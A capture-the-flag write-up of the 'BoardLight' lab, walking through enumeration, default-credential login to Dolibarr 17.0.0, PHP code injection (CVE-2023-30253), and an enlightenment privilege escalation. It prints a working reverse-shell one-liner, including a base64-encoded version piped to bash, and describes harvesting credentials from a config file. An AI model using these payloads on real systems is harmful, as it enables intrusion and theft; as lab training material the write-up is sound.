# BoardLight

Linux . Easy

## Enumeration

### Nmap Scan

As always as we will strat by doing an Nmap Scan

Command:

```
nmap -A -sCV -p- 10.10.11.11 > BoardLight.xml
``` 

Output:

![image](https://github.com/user-attachments/assets/da813de9-f819-4fe3-9a3b-e66c8b1fdc81)

Analysis:

From the results of Nmap scan we can conclude the following open ports and their services

|Port|Service version|
|---|---|
|22|OpenSSH 8.2p1|
|80|Apache httpd 2.4.41|

As we can see there is a web aplication hosted on the Ip address given lets explore it further.

### Exploring the Web Application

![image](https://github.com/user-attachments/assets/85bf40fb-a405-4e2a-9865-ed29a1ab6168)

Here at the bottom of home page we find host name for the webpage.

![image](https://github.com/user-attachments/assets/9f05acfb-60a7-45df-ab3e-89115ad366ea)

Lets just add it to our `/etx/hosts` file corelating to the IP address of the machine.

### Fuzzing for directories

Command:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://board.htb/FUZZ
```

Output:

![image](https://github.com/user-attachments/assets/2bb07582-14ae-4454-8a9b-b71c5512de90)

Analysis:

There is nothing useful in terms of us able to compromise this web application.

### Fuzzing fior Subdomains

Command:

```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://board.htb/ -H "Host: FUZZ.board.htb" -fs 15949
```

> `fs` is used to exclude a specific fiel size from teh results to get only something that can be usefull to us. run the command without the option `fs` to know what parameter to use.

Output:

![image](https://github.com/user-attachments/assets/65b90568-07fd-4686-8ff6-e9e7282204f8)

Here we Found a subdomain *crm*.

### Exploring Subdomain `crm.board.htb`

Fist lets add it to `/etc/hosts` to access it.

![image](https://github.com/user-attachments/assets/484f4c08-52a9-4dd2-8e66-f557aa9e82b9)

And as the domain name suggests it turns out to be login portal for a "Customer relationship management (CRM)" portal.

Also it states teh CRM version which is `Dolibarr 17.0.0`.

lets us try default credentials which after a quick search turns out to be `admin/admin`.

![image](https://github.com/user-attachments/assets/faf63444-f1c9-4ac1-aff9-30e7b0c9b865)

Turns out the credentials do work but developers have disables access to this machine. But we are able to be authenticated as the user `admin`.

Thenm after some quick searches over internet we got face to face a "Authenticated PHP Code Injection (CVE-2023-30253)" vulnerability in Dolibarr 17.0.0.

[Dolibarr 17.0.0 PHP Code Injection (CVE-2023-30253)](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)

### Understanding CVE-2023-30253

This vulnerability enables authenticated users to execute remote code by utilizing an uppercase maniplulation technique in injected data.

To take advantage of this vulnerability the authenticated users must have the following permissions-

1. Read webiste content
2. Create/modify webiste content (html and javascript content)

To test it out try creating a webpage using the following content.

```
<?php echo 2+2;?>
```

![image](https://github.com/user-attachments/assets/71bd392c-97fc-4a19-a9af-7bab132d4008)

Here we gets an error indicating the authenticated user do not have to add or edit dynamic PHP content.

This is where the vulnerability comes in, by changing `php` to `PHP` (uppercase manipulation) authenticated user is able to inject PHP code even when the authenticated user do not have permission to do so.

And doing so the we are able to inject the PHP code:

![image](https://github.com/user-attachments/assets/cd24d948-d375-4ff0-9427-a51837ca3d54)

Also, this PHP tage (upper case) also bypass the check on the forbidden php functions in **core/lib/website2.lib.php**.

Therefore by using the following command:

```
<?PHP echo system("whoami")?>
```

Output:

![image](https://github.com/user-attachments/assets/528873ea-6d43-4bbd-9663-0910c4e6e278)

We are able to execute CLI commands on teh target machine.

## Exploitation

Now lets take advantage of CVE-2023-30253 and get a reverse shell using a PHP reverse shell on the target web application.

Lets use the following payload:

```
sh -i >& /dev/tcp/10.10.14.244/1234 0>&1
```

Lets encode it first to `Base64` so that it can be passed through the PHP syntax without triggering any errors.

![image](https://github.com/user-attachments/assets/50434061-19d1-44d2-ae34-8294d29b3386)

Lets use the following command to make sure the payload is decoded before being executed.

```
<?PHP system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQ0LzEyMzQgMD4mMQo= | base64 -d | bash"); ?>
```

Giving us a reverse shell as the user `www-data`

![image](https://github.com/user-attachments/assets/73da1dd5-3802-46cf-a968-f7be67e177af)

While trying to look around for information to be used.

![image](https://github.com/user-attachments/assets/15ceeaff-2a15-44a8-bb1d-e48a2cd08505)

We found some promising files in the directory `/var/www/html/crm.board.htb/htdocs/conf`. 

![image](https://github.com/user-attachments/assets/ac963679-4e54-4deb-a08e-807cd54cb5b5)

After investigating the `conf.php` we found a set of credentials.

![image](https://github.com/user-attachments/assets/3161cd1e-6e52-4181-8e33-272b5b892482)

Also, found the user name which should be our target to achieve to get the user flag in home directory.

![image](https://github.com/user-attachments/assets/8ffe5670-1892-400a-aadc-40c5cb9e1677)

Now, lets try to login via SSH using the password found in the `conf.php` and the user name `larissa`.

![image](https://github.com/user-attachments/assets/f65fc58a-4014-414e-bc30-d82f8b265697)

Now as we have successfullly gained acces to the user we will get the user flag.

![image](https://github.com/user-attachments/assets/26216218-4bea-467c-b1b4-a48e161cbda1)

## Priviledge Escalation

Lets start with trying to find out if there any commands we can run as root without providing the password using the `sudo -l` command.

![image](https://github.com/user-attachments/assets/31a3d262-8f83-4fe1-b1e2-077398954e1d)

Turns out our user "Larissa" can not run any command as sudo.

Let us try `linpeas.sh`.

![image](https://github.com/user-attachments/assets/4ba41240-8a43-47d4-b0bc-21c9528dacd5)

Here the `enlightenment files look intresting`. After a quick search we found a CVE for this utility CVE-2022-37706.

In this CVE `enlightenment_sys` allows local users in this case "larissa" o gain privileges because it is setuid root, and the system library function mishandles pathnames that begin with a /dev/.. substring. 

Lets use this exploit available on [GitHub](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit).

![image](https://github.com/user-attachments/assets/5018b9f9-c666-4def-b184-3f52b23c2cad)

lets run the `exploit.sh` in the as the user "larissa" to gain admin priviledges.

![image](https://github.com/user-attachments/assets/cfbaacce-9661-4d83-9c85-7ca690606c84)

Now we can just get the root flag solving this lab.

![image](https://github.com/user-attachments/assets/736468f1-00bf-4117-8254-90cdbd845b7e)

## Let's Connect

I welcome your insights, feedback, and opportunities for collaboration. Together, we can make the digital world safer, one challenge at a time.

- **LinkedIn**: (https://www.linkedin.com/in/aashwadhaama/)

I look forward to connecting with fellow cybersecurity enthusiasts and professionals to share knowledge and work together towards a more secure digital environment.

This process ultimately resulted in gaining a root shell, enabling access to the coveted root flag.
